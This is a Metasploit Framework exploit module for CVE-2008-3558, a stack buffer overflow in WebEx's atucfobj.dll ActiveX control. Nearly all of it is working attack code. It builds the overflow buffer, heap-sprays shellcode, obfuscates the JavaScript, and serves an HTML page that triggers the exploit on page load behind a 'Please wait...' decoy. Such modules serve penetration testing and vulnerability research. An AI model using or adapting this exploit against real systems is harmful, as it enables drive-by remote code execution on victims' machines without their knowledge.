##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in WebEx's WebexUCFObject
				ActiveX Control. If an long string is passed to the 'NewObject' method, a stack-
				based buffer overflow will occur when copying attacker-supplied data using the
				sprintf function.

				It is noteworthy that this vulnerability was discovered and reported by multiple
				independent researchers. To quote iDefense's advisory, "Before this issue was
				publicly reported, at least three independent security researchers had knowledge
				of this issue; thus, it is reasonable to believe that even more people were aware
				of this issue before disclosure."

				NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload
				into memory unmodified.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Tobias Klein',     # initial discoverer
					'Elazar Broad',     # initial discoverer
					'Guido Landi',      # milw0rm exploit
					'jduck'             # metasploit version
				],
			'References'     =>
				[
					[ 'CVE', '2008-3558' ],
					[ 'OSVDB', '47344' ],
					[ 'BID', '30578' ],
					[ 'EDB', '6220' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=849' ],
					[ 'URL', 'http://www.trapkit.de/advisories/TKADV2008-009.txt' ],
					[ 'URL', 'http://tk-blog.blogspot.com/2008/09/vulnerability-rediscovery-xss-and-webex.html' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2008-08/0084.html' ],
					[ 'URL', 'http://www.cisco.com/en/US/products/products_security_advisory09186a00809e2006.shtml' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested with atucfobj.dll v20.2008.2601.4928
					[ 'Windows Universal', { 'Ret' => 0x0c0c0c0c } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 06 2008'))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		# ActiveX parameters
		progid = "WebexUCFObject.WebexUCFObject"
		clsid = "32E26FD9-F435-4A20-A561-35D4B987CFDC"

		# Set parameters
		fnname = rand_text_alpha(8+rand(8))
		offset = 232

		# Build the exploit buffer
		sploit = rand_text_alphanumeric(offset)
		sploit << [target.ret - 0x20000].pack('V')

		# Encode variables
		sploit = Rex::Text.to_hex(sploit, '%')
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Prepare the heap spray parameters
		spray_num = "0x%x" % target.ret

		# Generate the final javascript
		js = %Q|
function #{fnname}()
{
try {
var obj = new ActiveXObject("#{progid}");
var my_unescape = unescape;
var shellcode = '#{shellcode}';
#{js_heap_spray}
sprayHeap(my_unescape(shellcode), #{spray_num}, 0x40000);
var sploit = my_unescape("#{sploit}");
obj.NewObject(sploit);
} catch( e ) { window.location = 'about:blank' ; }
}
|

		# Obfuscate the javascript
		opts = {
			'Strings' => true,
			'Symbols' => {
				'Variables' => %w{ obj my_unescape shellcode arg1 arg2 sploit }
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.obfuscate()

		# Build the final HTML
		content = %Q|<html>
<head>
<script language=javascript>
#{js}
</script>
</head>
<body onload="#{fnname}()">
Please wait...
</body>
</html>
|

		print_status("Sending #{self.name}")

		send_response_html(cli, content)

		handler(cli)

	end

end
